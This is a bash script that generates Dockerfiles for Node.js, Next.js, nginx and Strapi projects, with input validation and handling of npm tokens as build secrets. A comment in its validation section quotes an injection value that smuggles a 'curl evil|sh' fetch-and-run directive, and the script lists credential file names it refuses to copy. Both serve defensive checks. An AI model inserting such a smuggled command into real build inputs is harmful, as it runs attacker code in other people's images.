#!/usr/bin/env bash

set -euo pipefail

# If base revision was set, we are going to use given revision
# BASE_REVISION="db70372fd4ecbc111cb195ebe249809d8f0768a3" curl -sL https://...
BASE_REVISION="${BASE_REVISION:-main}"
# Validate BASE_REVISION before it is interpolated into any fetch URL. Accept only
# a git commit SHA, tag, or branch name; reject shell metacharacters and any '..'
# sequence (curl normalizes '../' in URL paths and could be repointed at an
# arbitrary repo/path). See SECURITY.md.
if [[ ! "$BASE_REVISION" =~ ^[A-Za-z0-9][A-Za-z0-9._/-]*$ || "$BASE_REVISION" == *..* ]]; then
  echo "Error: invalid BASE_REVISION '${BASE_REVISION}'. Use a commit SHA, tag, or branch name (chars [A-Za-z0-9._/-], no '..')." >&2
  exit 1
fi
BASE_URL="https://raw.githubusercontent.com/orochi-network/dev-off/${BASE_REVISION}"

# ============================================================================
# Default values
# ============================================================================
BUILDER_BASE_IMAGE="orochinetwork/ubuntu:node"
BUILDER_USER="ubuntu"
BUILDER_GROUP="ubuntu"
BUILDER_WORKDIR="/home/ubuntu/app"

RUNNER_BASE_IMAGE="node:24-alpine"
RUNNER_USER="node"
RUNNER_GROUP="node"
RUNNER_WORKDIR="/home/node/app"

# ============================================================================
# CLI variables
# ============================================================================
DOCKER_TEMPLATE=""
# Which remote build script the generated Dockerfile fetches
# (build-prod-${BUILD_SCRIPT_TEMPLATE}.sh). Defaults to the template name; a
# template whose build is identical to another's can point at the shared script
# (e.g. strapi reuses build-prod-node.sh). Set in the per-template case block.
BUILD_SCRIPT_TEMPLATE=""
DOCKER_FILE=()
DOCKER_COMMAND="[\"npm\", \"start\"]"
BUILD_COMMAND=""
RUNNER_COMMANDS=()
RUNNER_IMAGE=""
DRY_RUN=false
EXTRA_ENV=""
EXPOSE_PORT=""
ENV_FILE=""
COREPACK_ENABLE=""
UNKNOWN_ARGS=()

# Templates that this script knows how to generate. Add new templates here and
# extend the "Template-specific overrides" case below. See DOCKERFILE.md.
SUPPORTED_TEMPLATES=("node" "nginx" "next" "strapi")

show_help() {
  cat <<EOF
Usage: ./dockerfile.sh [OPTIONS]

Generate Dockerfile for Node.js projects with customizable runner stages.

Options:
  -t, --template TYPE        Template type: node, nginx, next, strapi
  -c, --command CMD          CMD to run (default: ["npm", "start"])
  -f, --file FILE            File/directory to copy (can be used multiple times)
                             Format: "file" or "src;dst" for custom paths
  -b, --build CMD            Custom build command (default: uses build-prod.sh)
  -r, --runner-image IMAGE   Custom runner image (default: node:24-alpine for node/next,
                             node:22-trixie-slim for strapi)
  -e, --env-file FILE        Copy specified .env file as .env before build
  --run CMD                  RUN command to execute in runner stage (repeatable)
  --dry-run                  Print Dockerfile to stdout instead of writing to file
  -l, --list                 List all templates with their details
  -h, --help                 Show this help message

File Copy Behavior:
  Single argument (-f file.txt):
    Copies from builder workdir to runner workdir
    Example: -f package.json
    Result: COPY --from=builder /home/ubuntu/app/package.json /home/node/app/package.json

  Two arguments (-f "src;dst"):
    Uses full paths for both source and destination
    Example: -f "nginx.conf;/etc/nginx/nginx.conf"
    Result: COPY --from=builder nginx.conf /etc/nginx/nginx.conf

Examples:
  # Basic Next.js project
  ./dockerfile.sh -t next -f .next -f package.json -f node_modules -f public

  # Custom runner image and CMD
  ./dockerfile.sh -t node -r node:24-trixie-slim -f build -f package.json \\
    -c '["node", "server.js"]'

  # Nginx with custom config path
  ./dockerfile.sh -t nginx -f "nginx.conf;/etc/nginx/conf.d/default.conf"

  # With post-copy RUN command and dry-run
  ./dockerfile.sh -t next -f .next -f package.json \\
    --run 'chmod +x /home/node/app/run-service.sh' --dry-run
EOF
}

list_templates() {
  cat <<EOF
Available templates:

  node    - Node.js application
           Builder: orochinetwork/ubuntu:node
           Runner: node:24-alpine (default)
           Files to copy: package.json, build/, node_modules/, etc.

  next    - Next.js application
           Builder: orochinetwork/ubuntu:node
           Runner: node:24-alpine (default, with NEXT_TELEMETRY_DISABLED=1)
           Files to copy: .next/, package.json, node_modules/, public/, next.config.*, etc.

  nginx   - Static website (React, Vue, or HTML/CSS/JS)
           Builder: orochinetwork/ubuntu:node
           Runner: nginx:stable-alpine
           Build output: build/ directory

  strapi  - Strapi headless CMS application
           Builder: orochinetwork/ubuntu:node (corepack enabled for Yarn 4)
           Runner: node:22-trixie-slim (default — glibc, REQUIRED for sharp/libvips)
           Default CMD: ["npm", "run", "start"] (EXPOSE 1337, NODE_ENV=production)
           Files to copy: config/, src/, database/, public/, types/, dist/,
                          .strapi/, tsconfig.json, package.json, node_modules/, etc.

Note: 'rust' is not implemented yet. To add a new template, see the
"Adding a new template" section in DOCKERFILE.md.
EOF
}

while [[ $# -gt 0 ]]; do
  case $1 in
  -h | --help)
    show_help
    exit 0
    ;;
  -l | --list)
    list_templates
    exit 0
    ;;
  -t | --template)
    DOCKER_TEMPLATE="$2"
    shift # Past argument
    shift # Past value
    ;;
  -c | --command)
    DOCKER_COMMAND=${2:-${DOCKER_COMMAND}}
    shift
    shift
    ;;
  -f | --file)
    DOCKER_FILE+=("$2")
    shift
    shift
    ;;
  -b | --build)
    BUILD_COMMAND="$2"
    shift
    shift
    ;;
  -r | --runner-image)
    RUNNER_IMAGE="$2"
    shift
    shift
    ;;
  --run)
    RUNNER_COMMANDS+=("$2")
    shift
    shift
    ;;
  -e | --env-file)
    ENV_FILE="$2"
    shift
    shift
    ;;
  --dry-run)
    DRY_RUN=true
    DF_BUFFER="/dev/stdout"
    shift
    ;;
  *)
    UNKNOWN_ARGS+=("$1") # Save unknown ones for later
    shift
    ;;
  esac
done

# ============================================================================
# Validate CLI input (fail fast instead of emitting a broken Dockerfile)
# ============================================================================
if [[ ${#UNKNOWN_ARGS[@]} -gt 0 ]]; then
  echo "Error: unknown argument(s): ${UNKNOWN_ARGS[*]}" >&2
  echo "Run '$0 --help' for usage." >&2
  exit 1
fi

if [[ -z "$DOCKER_TEMPLATE" ]]; then
  echo "Error: a template is required (-t|--template). Supported: ${SUPPORTED_TEMPLATES[*]}" >&2
  exit 1
fi

TEMPLATE_OK=false
for t in "${SUPPORTED_TEMPLATES[@]}"; do
  [[ "$DOCKER_TEMPLATE" == "$t" ]] && TEMPLATE_OK=true && break
done
if [[ "$TEMPLATE_OK" != true ]]; then
  echo "Error: unsupported template '${DOCKER_TEMPLATE}'. Supported: ${SUPPORTED_TEMPLATES[*]}" >&2
  exit 1
fi

# Reject control characters in any user-supplied value. Without this, a value
# such as $'build\nRUN curl evil|sh' would inject extra directives into the
# generated Dockerfile: the perl/$ENV{...} pass and the line-oriented emitters
# (generate_copy_instructions, generate_runner_commands) treat an embedded
# newline as the start of a new Dockerfile line. See SECURITY.md.
contains_control_char() { [[ "$1" == *$'\n'* || "$1" == *$'\r'* ]]; }
for v in "$DOCKER_COMMAND" "$BUILD_COMMAND" "$RUNNER_IMAGE" "$ENV_FILE" \
  "${DOCKER_FILE[@]+"${DOCKER_FILE[@]}"}" \
  "${RUNNER_COMMANDS[@]+"${RUNNER_COMMANDS[@]}"}"; do
  if contains_control_char "$v"; then
    echo "Error: argument values may not contain newlines or carriage returns." >&2
    exit 1
  fi
done

# Refuse to copy credential files into any image layer (defense-in-depth against
# leaking npm/registry tokens from the builder into the runner image). Both the
# source and the destination name are checked, case-insensitively, so neither
# `-f .NPMRC` nor `-f "README.md;.npmrc"` can smuggle a credential file in.
is_credential_name() {
  case "$(basename "$1" | tr '[:upper:]' '[:lower:]')" in
  .npmrc | .yarnrc | .yarnrc.yml | .netrc) return 0 ;;
  *) return 1 ;;
  esac
}
for item in "${DOCKER_FILE[@]+"${DOCKER_FILE[@]}"}"; do
  # At most one ';' may separate src from dst. More than one is ambiguous: this
  # guard reads dst as the last field while the COPY generator reads it as the
  # second field, so they would disagree on what is being copied. Reject it.
  semicolons="${item//[^;]/}"
  if [[ "${#semicolons}" -gt 1 ]]; then
    echo "Error: -f value '${item}' contains more than one ';' (use 'src' or 'src;dst')." >&2
    exit 1
  fi
  src="${item%%;*}"
  dst="${item##*;}" # equals src when there is no ';'
  for name in "$src" "$dst"; do
    if is_credential_name "$name"; then
      echo "Error: refusing to copy credential file ('${name}') into the image. Use --mount=type=secret instead." >&2
      exit 1
    fi
  done
done

CWD=$(pwd)
if [[ "$DRY_RUN" == false ]]; then
  DF_BUFFER="${CWD}/Dockerfile"
fi

check_file() {
  if [[ ! -f "$1" ]]; then
    echo "File $1 was not existed"
    exit 1
  fi
}

# ============================================================================
# Template-specific overrides
# ============================================================================
# Default the remote build script to this template's own; a case branch may
# repoint it at a shared script.
BUILD_SCRIPT_TEMPLATE="$DOCKER_TEMPLATE"
case "$DOCKER_TEMPLATE" in
node)
  RUNNER_BASE_IMAGE="${RUNNER_IMAGE:-node:24-alpine}"
  COREPACK_ENABLE="corepack enable"
  ;;
nginx)
  RUNNER_BASE_IMAGE="nginx:stable-alpine"
  RUNNER_USER="nginx"
  RUNNER_GROUP="nginx"
  RUNNER_WORKDIR="/usr/share/nginx/html"
  DOCKER_COMMAND="[\"nginx\", \"-g\", \"daemon off;\"]"
  EXPOSE_PORT=$'\nEXPOSE 80'
  # NOTE: nginx runs as the non-root 'nginx' user (USER nginx). Binding :80 then
  # requires the host kernel to allow it (net.ipv4.ip_unprivileged_port_start=0,
  # the default on Docker Desktop). On a stock-kernel Linux host (threshold 1024)
  # a non-root master cannot bind :80; switch this and configs/nginx.conf to 8080.
  # Fix permissions for non-root nginx: create cache dirs, relocate pid, disable 'user' directive
  RUNNER_COMMANDS+=("mkdir -p /var/cache/nginx/client_temp /var/cache/nginx/proxy_temp /var/cache/nginx/fastcgi_temp /var/cache/nginx/uwsgi_temp /var/cache/nginx/scgi_temp && chown -R nginx:nginx /var/cache/nginx && sed -i 's|^user  nginx;|# user  nginx;|' /etc/nginx/nginx.conf && sed -i 's|pid */run/nginx.pid;|pid /tmp/nginx.pid;|' /etc/nginx/nginx.conf")
  # For nginx, if no files specified, use default build directory
  if [[ ${#DOCKER_FILE[@]} -eq 0 ]]; then
    DOCKER_FILE=("build;/usr/share/nginx/html")
  fi
  ;;
next)
  RUNNER_BASE_IMAGE="${RUNNER_IMAGE:-node:24-alpine}"
  EXTRA_ENV=$'\nENV NEXT_TELEMETRY_DISABLED=1'
  COREPACK_ENABLE="corepack enable"
  ;;
strapi)
  # Runner DEFAULTS to a glibc image (node:22-trixie-slim), NOT alpine/musl:
  # Strapi's native sharp/libvips are built against glibc and break at runtime on
  # musl. A -r/RUNNER_IMAGE override is still honored (use a glibc image).
  RUNNER_BASE_IMAGE="${RUNNER_IMAGE:-node:22-trixie-slim}"
  # NODE_ENV=production so Strapi serves the prebuilt admin panel and skips dev
  # tooling at runtime.
  EXTRA_ENV=$'\nENV NODE_ENV=production'
  # The base image ships Yarn 1; Strapi projects use Yarn 4 berry, so corepack
  # must be enabled to run the pinned package manager. corepack is enabled by the
  # dedicated builder RUN layer (COREPACK_ENABLE) before the build script runs.
  COREPACK_ENABLE="corepack enable"
  # A Strapi build IS a node build: immutable install + `yarn build` (which runs
  # `strapi build`). Reuse the shared build-prod-node.sh instead of a duplicate
  # per-template script. The Strapi-specific bits (glibc runner, corepack layer,
  # copy set, NODE_ENV/EXPOSE/CMD) all live in this case block.
  BUILD_SCRIPT_TEMPLATE="node"
  DOCKER_COMMAND="[\"npm\", \"run\", \"start\"]"
  EXPOSE_PORT=$'\nEXPOSE 1337'
  # Sensible default runtime copy set for a built Strapi app (overridable via -f).
  # tsconfig.json is load-bearing: Strapi reads its outDir to locate dist/.
  if [[ ${#DOCKER_FILE[@]} -eq 0 ]]; then
    DOCKER_FILE=(config src database public types dist .strapi tsconfig.json package.json node_modules favicon.png)
  fi
  ;;
esac

# ============================================================================
# Generate COPY instructions
# ============================================================================
generate_copy_instructions() {
  for item in "${DOCKER_FILE[@]+"${DOCKER_FILE[@]}"}"; do
    if [[ "$item" == *";"* ]]; then
      # Two arguments: custom source and destination paths
      IFS=';' read -r src dst <<< "$item"
      # Prepend BUILDER_WORKDIR for relative source paths
      if [[ "$src" != /* ]]; then
        src="${BUILDER_WORKDIR}/${src}"
      fi
      echo "Copy file (custom): ${src} → ${dst}" >&2
      echo "COPY --from=builder --chown=${RUNNER_USER}:${RUNNER_GROUP} ${src} ${dst}"
    else
      # One argument: copy from builder workdir to runner workdir
      echo "Copy file: ${item}" >&2
      echo "COPY --from=builder --chown=${RUNNER_USER}:${RUNNER_GROUP} ${BUILDER_WORKDIR}/${item} ./${item}"
    fi
  done
}

# ============================================================================
# Generate runner commands
# ============================================================================
generate_runner_commands() {
  if [[ ${#RUNNER_COMMANDS[@]} -gt 0 ]]; then
    echo ""
    for cmd in "${RUNNER_COMMANDS[@]}"; do
      echo "RUN ${cmd}"
    done
  fi
}

# ============================================================================
# Generate build command
# ============================================================================
generate_build_command() {
  # Determine the actual build step ("inner" command).
  local inner
  if [[ -n "$BUILD_COMMAND" ]]; then
    echo "Using custom build command" >&2
    inner="$BUILD_COMMAND"
  elif [[ -f "$CWD/scripts/build-prod.sh" ]]; then
    echo "Using local build-prod.sh" >&2
    inner="chmod +x scripts/build-prod.sh && ./scripts/build-prod.sh"
  else
    echo "Using remote build script" >&2
    echo "WARNING: no local scripts/build-prod.sh found — the generated Dockerfile" >&2
    echo "         will fetch and execute the build script from dev-off at build time." >&2
    echo "         Pin BASE_REVISION to a commit SHA, or commit scripts/build-prod.sh," >&2
    echo "         to avoid trusting a moving branch. See SECURITY.md." >&2
    local build_script="${BASE_URL}/scripts/build-prod-${BUILD_SCRIPT_TEMPLATE}.sh"
    inner="curl -fsSL ${build_script} | bash -eo pipefail"
  fi

  # Emit a single RUN that mounts the npm token as a BuildKit secret, writes the
  # .npmrc/.yarnrc.yml, runs the build, and removes the credential files — all in
  # one layer, so the token never persists in any builder-stage layer. mode=0444
  # lets the non-root builder user read the mounted secret. If the build fails,
  # `set -e` aborts the RUN (no layer is committed → still no leak).
  # Emit the Dockerfile lines with printf '%s\n' so the literal \n / \" escape
  # sequences pass through verbatim to the generated Dockerfile. Multi-line
  # .yarnrc.yml writes use `printf` at build time (POSIX printf interprets \n in
  # every shell), not `echo` (whose \n handling depends on the builder's /bin/sh).
  local h="/home/${BUILDER_USER}"
  printf '%s\n' "# Application version, injected from the build host (image context has no .git)"
  printf '%s\n' "ARG APP_VERSION"
  printf '%s\n' 'ENV APP_VERSION=${APP_VERSION}'
  printf '%s\n' "# Build with npm auth mounted as a secret (token never persists in a layer)"
  printf '%s\n' "RUN --mount=type=secret,id=npm_access_token,mode=0444 set -eu && \\"
  printf '%s\n' "  NPM_ACCESS_TOKEN=\$(cat /run/secrets/npm_access_token) && \\"
  printf '%s\n' "  echo \"//registry.npmjs.org/:_authToken=\$NPM_ACCESS_TOKEN\" > ${h}/.npmrc && \\"
  printf '%s\n' "  printf 'enableTelemetry: false\\nnodeLinker: node-modules\\nnpmScopes:\\n' > ${h}/.yarnrc.yml && \\"
  printf '%s\n' "  echo \"  orochi-network:\" >> ${h}/.yarnrc.yml && \\"
  printf '%s\n' "  printf '    npmRegistryServer: \"https://registry.npmjs.org\"\\n    npmAlwaysAuth: true\\n' >> ${h}/.yarnrc.yml && \\"
  printf '%s\n' "  echo \"    npmAuthToken: \$NPM_ACCESS_TOKEN\" >> ${h}/.yarnrc.yml && \\"
  printf '%s\n' "  echo \"  zkdb:\" >> ${h}/.yarnrc.yml && \\"
  printf '%s\n' "  printf '    npmRegistryServer: \"https://registry.npmjs.org\"\\n    npmAlwaysAuth: true\\n' >> ${h}/.yarnrc.yml && \\"
  printf '%s\n' "  echo \"    npmAuthToken: \$NPM_ACCESS_TOKEN\" >> ${h}/.yarnrc.yml && \\"
  printf '%s\n' "  { ${inner} ; } && \\"
  printf '%s\n' "  rm -f ${h}/.npmrc ${h}/.yarnrc.yml"
}

# ============================================================================
# Generate env file copy
# ============================================================================
generate_env_copy() {
  if [[ -n "$ENV_FILE" ]]; then
    echo "Copying env file: ${ENV_FILE} → ./.env" >&2
    echo "COPY --chown=${BUILDER_USER}:${BUILDER_GROUP} ${ENV_FILE} ./.env"
  fi
}

# ============================================================================
# Generate corepack enable command
# ============================================================================
# Emit corepack enable as its own RUN layer when the template requires it
# (node/next). Kept as a standalone command instead of being chained onto the
# runner chmod, so the template carries no shell operators in its variables.
generate_corepack_run() {
  if [[ -n "$COREPACK_ENABLE" ]]; then
    echo "# Enable corepack to manage the project's package manager"
    echo "RUN ${COREPACK_ENABLE}"
  fi
}

# ============================================================================
# Process template
# ============================================================================
echo "Generating Dockerfile using template: ${DOCKER_TEMPLATE}"

# Private working directory (avoids predictable /tmp names → symlink/race attacks
# on shared self-hosted runners). Cleaned up on any exit.
TMP_WORK="$(mktemp -d "${TMPDIR:-/tmp}/dockerfile.XXXXXX")"
trap 'rm -rf "$TMP_WORK"' EXIT

TEMPLATE_FILE="${CWD}/Dockerfile.template"
if [[ ! -f "$TEMPLATE_FILE" ]]; then
  # Try to download from remote
  echo "Downloading template from ${BASE_URL}/Dockerfile.template"
  curl -fsSL "${BASE_URL}/Dockerfile.template" -o "$TMP_WORK/Dockerfile.template"
  TEMPLATE_FILE="$TMP_WORK/Dockerfile.template"
fi

# Write multi-line content to temp files
generate_copy_instructions > "$TMP_WORK/copy_instructions.txt"
generate_runner_commands > "$TMP_WORK/runner_commands.txt"
generate_build_command > "$TMP_WORK/build_command.txt"
generate_env_copy > "$TMP_WORK/env_copy.txt"
generate_corepack_run > "$TMP_WORK/corepack_run.txt"

# Replace simple placeholders. Values are passed via the environment and read
# with $ENV{...} so that user-controlled content (commands, image names, CMD)
# is inserted literally and can never be interpreted as perl/regex — closing a
# Dockerfile/command-injection vector that existed when values were interpolated
# directly into the perl source.
builder_base_image="$BUILDER_BASE_IMAGE" \
builder_user="$BUILDER_USER" \
builder_group="$BUILDER_GROUP" \
runner_base_image="$RUNNER_BASE_IMAGE" \
runner_user="$RUNNER_USER" \
runner_group="$RUNNER_GROUP" \
runner_workdir="$RUNNER_WORKDIR" \
extra_env="$EXTRA_ENV" \
expose_port="$EXPOSE_PORT" \
cmd="$DOCKER_COMMAND" \
perl -pe '
  s/\{\{builder_base_image\}\}/$ENV{builder_base_image}/g;
  s/\{\{builder_user\}\}/$ENV{builder_user}/g;
  s/\{\{builder_group\}\}/$ENV{builder_group}/g;
  s/\{\{runner_base_image\}\}/$ENV{runner_base_image}/g;
  s/\{\{runner_user\}\}/$ENV{runner_user}/g;
  s/\{\{runner_group\}\}/$ENV{runner_group}/g;
  s/\{\{runner_workdir\}\}/$ENV{runner_workdir}/g;
  s/\{\{extra_env\}\}/$ENV{extra_env}/g;
  s/\{\{expose_port\}\}/$ENV{expose_port}/g;
  s/\{\{cmd\}\}/$ENV{cmd}/g;
' "$TEMPLATE_FILE" > "$TMP_WORK/dockerfile_partial.txt"

# Now replace multi-line placeholders by reading the line and replacing when we see the marker
while IFS= read -r line; do
  if [[ "$line" == "{{build_command}}" ]]; then
    cat "$TMP_WORK/build_command.txt"
  elif [[ "$line" == "{{copy_instructions}}" ]]; then
    cat "$TMP_WORK/copy_instructions.txt"
  elif [[ "$line" == "{{runner_commands}}" ]]; then
    cat "$TMP_WORK/runner_commands.txt"
  elif [[ "$line" == "{{env_copy}}" ]]; then
    cat "$TMP_WORK/env_copy.txt"
  elif [[ "$line" == "{{corepack_run}}" ]]; then
    cat "$TMP_WORK/corepack_run.txt"
  else
    echo "$line"
  fi
done < "$TMP_WORK/dockerfile_partial.txt" > "$TMP_WORK/dockerfile_pre_final.txt"

# Remove consecutive blank lines (keep only one)
awk 'BEGIN {blank=0} /^[[:space:]]*$/ {blank++; if(blank==1) print; next} {blank=0; print}' "$TMP_WORK/dockerfile_pre_final.txt" > "$DF_BUFFER"

if [[ "$DRY_RUN" == false ]]; then
  echo "Dockerfile generated successfully: $DF_BUFFER"
fi
